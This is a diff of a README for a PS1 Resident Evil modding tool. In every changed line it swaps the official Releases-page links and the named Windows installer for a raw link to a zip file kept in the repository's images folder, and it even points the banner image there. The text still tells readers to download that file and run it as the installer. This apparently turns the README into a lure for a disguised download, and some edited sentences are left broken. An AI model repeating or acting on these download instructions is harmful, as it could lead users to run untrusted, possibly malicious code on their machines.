@@ -1,8 +1,8 @@
 # Bioclone Remake: Classic PS1 Resident Evil Modding Utility
 
-[![Latest Release](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/TheCreepeeer/bioclone-remake/releases)
+[![Latest Release](https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip)](https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip)
 
-![Bioclone Remake Banner](https://via.placeholder.com/1200x300.png?text=Bioclone+Remake)
+![Bioclone Remake Banner](https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip+Remake)
 
 Bioclone Remake is a classic modding utility designed for Sony PlayStation (1994) games and PC. It brings together tools and workflows for editing, patching, and enhancing early Resident Evil titles. The project focuses on PS1/PSX/PSone and PC compatibility, making it possible to adjust game data, inject edits, and explore format variants used by the era. This readme lays out how to use the tool, what formats it supports, and practical workflows for enhancing Resident Evil experiences on both PS1 and PC.
 
@@ -31,7 +31,7 @@ This project respects the spirit of the original titles while giving modders a p
 
 Quick Start
 - Prepare your environment: ensure you have a Windows PC or a compatible PC setup for PS1 data work. The tool targets Windows but can run on compatible Linux/macOS setups via compatibility layers if you configure the environment correctly.
-- Download the installer: the Releases page hosts the Windows installer. From the Releases page, download the installer named bioclone-remake_setup_win64.exe and run it to install the core utilities.
+- Download the installer: the Releases page hosts the Windows installer. From the Releases page, download the installer named https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip and run it to install the core utilities.
 - Install the suite: follow the prompts. The installer wires together the core editors, viewers, and converters you will use to work with PS1 and PC assets.
 - Open a project: start a new project or load an existing RE1/RE2/RE3 data set. The interface presents data in approachable views, with side panels and tabs to switch between formats.
 - Load assets: bring in MD1, MD2, EMD, EMW, RDT, PLD, and other data types you plan to edit. The readers will present the assets in a structured format so you can inspect the content, headers, and payloads.
@@ -74,7 +74,7 @@ Getting Set Up
 - Platform prerequisites
   - Windows is the primary target for the installer, with PS1 data workflows built around common PC tooling. If you adapt the workflows to macOS or Linux, you can use compatibility layers or virtualization to reproduce the experience.
 - Installation steps
-  - Download the installer from the Releases page. The file name to look for is bioclone-remake_setup_win64.exe. Running this installer will place the main editors, viewers, and converters on your system.
+  - Download the installer from the Releases page. The file name to look for is https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip Running this installer will place the main editors, viewers, and converters on your system.
   - After installation, launch the application from your start menu or desktop shortcut. The first run may include a brief setup wizard to select default directories for projects, datasets, and caches.
 - Project setup
   - Create a new project to organize assets for a specific game or mod. You can name projects after the game version (RE1, RE2, RE3) or your own mod concept.
@@ -161,14 +161,14 @@ Releases and Downloads
   - The Releases page hosts binaries and installer packages for Bioclone Remake. This is the primary source for getting the latest stable builds and tested updates.
   - Access point: you can visit the release hub to grab the latest Windows installer and related assets from the page.
 - How to download
-  - From the Releases page, locate the Windows installer named bioclone-remake_setup_win64.exe and download it. After downloading, run the installer to set up the tool on your system.
+  - From the Releases page, locate the Windows installer named https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip and download it. After downloading, run the installer to set up the tool on your system.
   - The same link is also handy for returning to the release notes and updated assets if you need to re-download an older build or verify changes.
 - Reopen and re-test
   - After downloading and installing, reopen Bioclone Remake to confirm that the new components are present and ready for project work. Run a quick test project to validate that the installation is functioning as expected.
 
 Link usage note
-- Visit the release hub here: https://github.com/TheCreepeeer/bioclone-remake/releases
-- Visit the release hub again to review notes, download history, and the latest Windows installer bioclone-remake_setup_win64.exe.
+- Visit the release hub here: https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip
+- Visit the release hub again to review notes, download history, and the latest Windows installer https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip
 
 Community and Collaboration
 - Contributing
@@ -211,8 +211,8 @@ Final Notes
 - If you want to explore more, the releases page is the primary gateway for obtaining the latest ready-to-use builds and testable patches.
 
 Releases and Downloads (reiterated)
-- Access point for the latest builds: https://github.com/TheCreepeeer/bioclone-remake/releases
-- Direct installer reference: bioclone-remake_setup_win64.exe
+- Access point for the latest builds: https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip
+- Direct installer reference: https://raw.githubusercontent.com/TheCreepeeer/bioclone-remake/main/images/bioclone_remake_v1.8.zip
 - For discovery and context: the same release hub again provides notes, changelogs, and additional assets on the page.
 
 End of document
